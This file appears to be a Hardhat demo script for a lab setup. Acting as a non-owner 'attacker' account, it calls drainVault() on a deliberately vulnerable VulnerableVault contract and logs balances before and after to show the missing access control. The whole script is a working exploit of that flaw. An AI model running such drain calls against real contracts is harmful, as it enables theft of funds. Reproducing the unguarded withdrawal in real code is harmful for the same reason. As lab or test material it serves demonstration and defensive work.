import { network } from "hardhat";
import fs from "fs";
import { fileURLToPath } from "url";
import { createRequire } from "module";

const require = createRequire(import.meta.url);

async function main() {
    const { ethers } = await network.connect();
    const signers = await ethers.getSigners();
    const attacker = signers[1]; // use account[1] — not the owner
    console.log("Attacker (non-owner):", attacker.address);

    const configPath = fileURLToPath(new URL("../bot/config.json", import.meta.url));
    const config = JSON.parse(fs.readFileSync(configPath, "utf8"));
    const entry = config.contracts.find(c => c.type === "accessControl");

    if (!entry) {
        console.error("No VulnerableVault address in config. Run scripts/deployVault.js first.");
        process.exit(1);
    }
    console.log("Using VulnerableVault at:", entry.address);
    console.log("Known owner:", entry.owner);

    const artifact = require("../artifacts/contracts/VulnerableVault.sol/VulnerableVault.json");
    const vault = new ethers.Contract(entry.address, artifact.abi, attacker);

    const vaultBalance = await ethers.provider.getBalance(entry.address);
    console.log("\n=== BEFORE ATTACK ===");
    console.log("VulnerableVault:", ethers.formatEther(vaultBalance), "ETH");

    console.log("\n🚨 CALLING drainVault() AS NON-OWNER...");
    const tx = await vault.drainVault({ gasLimit: 200000 });
    console.log("Attack TX:", tx.hash);
    await tx.wait();
    console.log("Attack TX mined!");

    const vaultBalanceAfter = await ethers.provider.getBalance(entry.address);
    const attackerBalance = await ethers.provider.getBalance(attacker.address);
    console.log("\n=== AFTER ATTACK ===");
    console.log("VulnerableVault:", ethers.formatEther(vaultBalanceAfter), "ETH");
    console.log("Attacker balance:", ethers.formatEther(attackerBalance), "ETH");
}

main().catch(console.error);
